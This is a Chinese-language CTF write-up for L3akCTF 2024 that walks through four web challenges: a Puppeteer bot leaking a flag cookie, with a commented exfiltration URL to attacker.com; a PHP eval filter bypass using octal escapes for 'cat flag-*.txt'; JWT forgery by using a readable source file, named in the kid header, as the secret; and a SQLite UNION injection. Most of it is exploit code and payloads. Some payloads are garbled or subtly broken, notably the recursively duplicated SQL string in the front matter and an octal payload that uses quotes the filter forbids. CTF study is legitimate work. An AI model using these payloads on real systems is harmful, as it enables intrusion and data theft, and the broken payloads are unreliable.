---
title: L3akCTF 2024 Writeup (Puppeteer bot + PHP eval + JWT kid + SQL 注入)
contest: L3akCTF
year: 2024
difficulty: medium
vuln_type: web_unknown
tags: [Puppeteer cookie, PHP eval, JWT kid 路径遍历, SQL 注入, octal escape, SQLite 注入]
attack_chain: |
  1. Puppeteer Cookie Bot:
     - await page.setCookie({name:"flag", value: CONFIG.APPFLAG, domain: CONFIG.APPHOST})
     - await page.goto(urlToVisit, {waitUntil: 'networkidle2'}) + sleep(8000)
     - cookies = await page.cookies() 输出 → 通过 urlToVisit 触发
  2. PHP popCalc eval: eval('$calc = ' . $formula . ';'); 长度 150 + preg_match('/[a-z\'"]+/i', $formula) 禁字母 + 单引号 + 双引号
     - 绕过: 8进制转义 `\143\141\164\40\146\154\141\147\55\52\56\164\170\164` = "cat flag-*.txt"
  3. JWT kid 路径遍历 (verify_jwt):
     - kid = header['kid']
     - assert ("/" not in kid)
     - with open(kid, 'r') as file: secret_key = file.read().strip()
     - 绕过: kid='bot.py' 读源文件当 secret_key (路径限制 / 但 bot.py 本身合法)
     - token = jwt.encode({'username': 'hamayanhamayan', 'role': 'VIP'}, secret_key, algorithm='HS256', headers={'kid': 'bot.py'})
  4. SQL 注入: cursor.execute(f'SELECT username,email,password FROM users WHERE username ="{username}"')
     - REPLACE(REPLACE('$', CHAR(39), CHAR(34)), CHAR(36), '$') 字符串替换绕过滤
     - payload: ' UNION SELECT REPLACE(REPLACE(' UNION SELECT REPLACE(REPLACE('$', CHAR(39), CHAR(34)), CHAR(36), '$') AS username, (SELECT flag FROM flags) AS email, 'a0a080f42e6f13b3a2df133f073095dd' AS password -- ', CHAR(39), CHAR(34)), CHAR(36), ' UNION SELECT REPLACE(REPLACE('$', CHAR(39), CHAR(34)), CHAR(36), '$') AS username, (SELECT flag FROM flags) AS email, 'a0a080f42e6f13b3a2df133f073095dd' AS password -- ' -- -') AS username, (SELECT flag FROM flags) AS email, "a0a080f42e6f13b3a2df133f073095dd" AS password -- " -- -
key_payload: |
  # Puppeteer cookie bot:
  // 攻击者 URL 触发 bot
  // http://attacker.com/?cookie=...
  // bot 8 秒后输出 cookies
  
  # PHP popCalc octal 绕过 (length 150 + 禁 a-z 单引号双引号):
  $formula = '\143\141\164\40\146\154\141\147\55\52\56\164\170\164'
  // = "cat flag-*.txt" (8 进制转义)
  
  # JWT kid bot.py:
  import jwt
  with open('src/BatBot/bot.py', 'r') as file:
      secret_key = file.read().strip()
  headers = {'kid': 'bot.py'}
  token = jwt.encode({'username': 'hamayanhamayan', 'role': 'VIP'}, secret_key, algorithm='HS256', headers=headers)
  
  # SQL REPLACE 注入 (过滤 [a-z\'"]):
  " UNION SELECT REPLACE(REPLACE('$', CHAR(39), CHAR(34)), CHAR(36), '$') AS username, (SELECT flag FROM flags) AS email, 'a0a080f42e6f13b3a2df133f073095dd' AS password -- ' -- -
one_liner: L3akCTF 2024 多类型 Web (Puppeteer cookie / PHP eval 8 进制绕过 / JWT kid 路径 / SQLite SQL 注入) 速查。
lesson: |
  - Puppeteer setCookie + 8 秒 waitUntil + page.cookies() 输出是标准 XSS+数据外带模板
  - PHP eval preg_match 禁 a-z' 时用 8 进制转义 \143\141\164 = "cat"
  - JWT kid 字段 = "kid file path" 模式, assert "/" not in kid 仍可用 "bot.py" 等合法文件名
  - SQL 注入过滤 [a-z\'"] 时用 CHAR(39)=' CHAR(34)=" + REPLACE 拼接字符串
  - SQLite 注入: SELECT * FROM users WHERE username ="' + inject + '"
  - python-jwt verify 流程: kid -> open(kid) -> secret_key -> jwt.decode
quality: high
---

# L3akCTF 2024 Writeup

> 来源: ctfiot.com 184419

## 1. Puppeteer Cookie Bot (XSS 数据外带)

```javascript
await page.setCookie({
  name: "flag",
  httpOnly: false,
  value: CONFIG.APPFLAG,
  domain: CONFIG.APPHOST
});
let cookies = await page.cookies();
console.log(cookies);

await page.goto(urlToVisit, { waitUntil: 'networkidle2' });
await sleep(8000);
cookies = await page.cookies();
console.log(cookies);
```

**攻击：** 攻击者 URL 包含外带端点，bot 8 秒后访问输出 cookies → XSS 触发数据外带。

## 2. PHP popCalc (eval + 字母过滤)

```php
function popCalc() {
    if (isset($_GET['formula'])) {
        $formula = $_GET['formula'];
        if (strlen($formula) >= 150 || preg_match('/[a-z\'"]+/i', $formula)) {
            return 'Try Harder !';
        }
        try {
            eval('$calc = ' . $formula . ';');
            return isset($calc) ? $calc : '?';
        } catch (ParseError $err) { return 'Error'; }
    }
}
```

**限制：** 长度 150 + 禁 a-z 字母 + 单引号 + 双引号

**绕过：** PHP 8 进制转义
```php
$formula = '\143\141\164\40\146\154\141\147\55\52\56\164\170\164'
// \143='c' \141='a' \164='t' \40=' ' \146='f' \154='l' \141='a' \147='g' \55='-' \52='*' \56='.' \164='t' \170='x' \164='t'
// = "cat flag-*.txt"
```

## 3. JWT kid bot.py (路径遍历)

```python
def verify_jwt(token):
    header = jwt.get_unverified_header(token)
    kid = header['kid']
    assert ("/" not in kid)  # 限制但可用 "bot.py"
    with open(kid, 'r') as file:
        secret_key = file.read().strip()
    decoded_token = jwt.decode(token, secret_key, algorithms=['HS256'])
    return decoded_token
```

**漏洞：** `assert ("/" not in kid)` 但 `kid = "bot.py"` 合法 → 读 `bot.py` 源文件当 secret key

**PoC：**
```python
import jwt
with open('src/BatBot/bot.py', 'r') as file:
    secret_key = file.read().strip()
headers = {'kid': 'bot.py'}
token = jwt.encode({'username': 'hamayanhamayan', 'role': 'VIP'},
                    secret_key, algorithm='HS256', headers=headers)
```

## 4. SQLite SQL 注入

```python
cursor.execute(f'SELECT username,email,password FROM users WHERE username ="{username}"')
```

**限制：** 过滤 [a-z\'"] （禁字母 + 单引号 + 双引号）

**绕过：** `CHAR(39)` = `'` + `CHAR(34)` = `"` + `CHAR(36)` = `$` + `REPLACE` 字符串替换

```sql
" UNION SELECT REPLACE(REPLACE('$',CHAR(39),CHAR(34)),CHAR(36),'$') AS username,
    (SELECT flag FROM flags) AS email,
    'a0a080f42e6f13b3a2df133f073095dd' AS password -- ' -- -
```

`CHAR(39)=CHAR(34)=CHAR(36)=` 替换后保持字符串不被黑名单。

## 评价

L3akCTF 2024 多类型 Web 速查，亮点是 **PHP 8 进制转义** 和 **JWT kid 合法文件名利用** + **CHAR() + REPLACE 注入** 三种过滤器绕过。

每道题都是"工具熟练度"考试，没有新洞但每种绕过技巧都值得背熟。
